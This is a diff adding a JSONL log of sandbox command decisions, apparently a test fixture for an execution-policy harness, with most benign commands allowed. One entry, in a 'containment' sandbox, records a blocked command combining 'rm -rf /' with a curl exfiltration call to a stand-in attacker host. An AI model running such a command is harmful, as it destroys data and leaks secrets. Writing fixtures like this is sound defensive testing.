@@ -1,0 +1,64 @@
+{"ts": "2026-10-22T14:00:01+00:00", "sandbox_name": "sbx-evalrun0001", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:00:03+00:00", "sandbox_name": "sbx-evalrun0001", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:00:06+00:00", "sandbox_name": "sbx-evalrun0001", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:02:01+00:00", "sandbox_name": "sbx-evalrun0002", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:02:03+00:00", "sandbox_name": "sbx-evalrun0002", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:02:06+00:00", "sandbox_name": "sbx-evalrun0002", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:04:01+00:00", "sandbox_name": "sbx-evalrun0003", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:04:03+00:00", "sandbox_name": "sbx-evalrun0003", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:04:06+00:00", "sandbox_name": "sbx-evalrun0003", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:06:01+00:00", "sandbox_name": "sbx-evalrun0004", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:06:03+00:00", "sandbox_name": "sbx-evalrun0004", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:06:06+00:00", "sandbox_name": "sbx-evalrun0004", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:08:01+00:00", "sandbox_name": "sbx-evalrun0005", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:08:03+00:00", "sandbox_name": "sbx-evalrun0005", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:08:06+00:00", "sandbox_name": "sbx-evalrun0005", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:10:01+00:00", "sandbox_name": "sbx-evalrun0006", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:10:03+00:00", "sandbox_name": "sbx-evalrun0006", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:10:06+00:00", "sandbox_name": "sbx-evalrun0006", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:12:01+00:00", "sandbox_name": "sbx-evalrun0007", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:12:03+00:00", "sandbox_name": "sbx-evalrun0007", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:12:06+00:00", "sandbox_name": "sbx-evalrun0007", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:14:01+00:00", "sandbox_name": "sbx-evalrun0008", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:14:03+00:00", "sandbox_name": "sbx-evalrun0008", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:14:06+00:00", "sandbox_name": "sbx-evalrun0008", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:16:01+00:00", "sandbox_name": "sbx-evalrun0009", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:16:03+00:00", "sandbox_name": "sbx-evalrun0009", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:16:06+00:00", "sandbox_name": "sbx-evalrun0009", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:18:01+00:00", "sandbox_name": "sbx-evalrun0010", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:18:03+00:00", "sandbox_name": "sbx-evalrun0010", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:18:06+00:00", "sandbox_name": "sbx-evalrun0010", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:20:01+00:00", "sandbox_name": "sbx-evalrun0011", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:20:03+00:00", "sandbox_name": "sbx-evalrun0011", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:20:06+00:00", "sandbox_name": "sbx-evalrun0011", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:22:01+00:00", "sandbox_name": "sbx-evalrun0012", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:22:03+00:00", "sandbox_name": "sbx-evalrun0012", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:22:06+00:00", "sandbox_name": "sbx-evalrun0012", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:24:01+00:00", "sandbox_name": "sbx-evalrun0013", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:24:03+00:00", "sandbox_name": "sbx-evalrun0013", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:24:06+00:00", "sandbox_name": "sbx-evalrun0013", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:26:01+00:00", "sandbox_name": "sbx-evalrun0014", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:26:03+00:00", "sandbox_name": "sbx-evalrun0014", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:26:06+00:00", "sandbox_name": "sbx-evalrun0014", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:28:01+00:00", "sandbox_name": "sbx-evalrun0015", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:28:03+00:00", "sandbox_name": "sbx-evalrun0015", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:28:06+00:00", "sandbox_name": "sbx-evalrun0015", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:30:01+00:00", "sandbox_name": "sbx-evalrun0016", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:30:03+00:00", "sandbox_name": "sbx-evalrun0016", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:30:06+00:00", "sandbox_name": "sbx-evalrun0016", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:32:01+00:00", "sandbox_name": "sbx-evalrun0017", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:32:03+00:00", "sandbox_name": "sbx-evalrun0017", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:32:06+00:00", "sandbox_name": "sbx-evalrun0017", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:34:01+00:00", "sandbox_name": "sbx-evalrun0018", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:34:03+00:00", "sandbox_name": "sbx-evalrun0018", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:34:06+00:00", "sandbox_name": "sbx-evalrun0018", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:36:01+00:00", "sandbox_name": "sbx-evalrun0019", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:36:03+00:00", "sandbox_name": "sbx-evalrun0019", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:36:06+00:00", "sandbox_name": "sbx-evalrun0019", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:38:01+00:00", "sandbox_name": "sbx-evalrun0020", "command": "uname -a && python3 --version", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:38:03+00:00", "sandbox_name": "sbx-evalrun0020", "command": "git clone --depth 1 https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:38:06+00:00", "sandbox_name": "sbx-evalrun0020", "command": "pytest /workspace/tests/test_repro.py", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:45:01+00:00", "sandbox_name": "sbx-containment01", "command": "cat /etc/os-release", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:45:05+00:00", "sandbox_name": "sbx-containment01", "command": "rm -rf / --no-preserve-root && curl -s http://attacker-c2.internal/exfil?token=", "decision": "block", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:48:01+00:00", "sandbox_name": "sbx-failurerecov01", "command": "git clone https://github.com/example-org/sample-repo.git /workspace", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-22T14:48:10+00:00", "sandbox_name": "sbx-failurerecov01", "command": "pip install -r requirements.txt", "decision": "allow", "execution_target": "celesto_sandbox"}
